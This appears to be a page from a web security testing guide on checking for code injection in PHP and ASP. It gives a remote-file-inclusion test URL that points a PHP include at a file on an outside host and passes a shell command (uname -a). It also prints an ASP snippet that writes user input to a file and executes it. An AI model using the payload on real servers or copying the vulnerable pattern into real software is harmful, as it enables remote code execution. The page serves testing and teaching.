## Summary

This section describes how a tester can check if it is possible to enter
code as input on a web page and have it executed by the web server.

In [Code Injection](Code_Injection "wikilink") testing, a tester submits
input that is processed by the web server as dynamic code or as an
included file. These tests can target various server-side scripting
engines, e.g.., ASP or PHP. Proper input validation and secure coding
practices need to be employed to protect against these attacks.

## How to Test

### Black Box testing

#### Testing for PHP Injection vulnerabilities

Using the querystring, the tester can inject code (in this example, a
malicious URL) to be processed as part of the included file:

`http://www.example.com/uptime.php?pin=http://www.example2.com/packx1/cs.jpg?&cmd=uname%20-a`

**Result Expected:**

The malicious URL is accepted as a parameter for the PHP page, which
will later use the value in an included file.

### Gray Box testing

#### Testing for ASP Code Injection vulnerabilities

Examine ASP code for user input used in execution functions. Can the
user enter commands into the Data input field? Here, the ASP code will
save the input to a file and then execute it:

`<%`
`If not isEmpty(Request( "Data" ) ) Then`
`Dim fso, f`
`'User input Data is written to a file named data.txt`
`Set fso = CreateObject("Scripting.FileSystemObject")`
`Set f = fso.OpenTextFile(Server.MapPath( "data.txt" ), 8, True)`
`f.Write Request("Data") & vbCrLf`
`f.close`
`Set f = nothing`
`Set fso = Nothing`

`'Data.txt is executed`
`Server.Execute( "data.txt" )`

`Else`
`%>`

<form>

<input name="Data" /><input type="submit" name="Enter Data" />

</form>

`<%`
`End If`
`%>)))`

## References

  - Security Focus - <http://www.securityfocus.com>

<!-- end list -->

  - Insecure.org - <http://www.insecure.org>

<!-- end list -->

  - Wikipedia - <http://www.wikipedia.org>

<!-- end list -->

  - Reviewing Code for [OS Injection](OS_Injection "wikilink")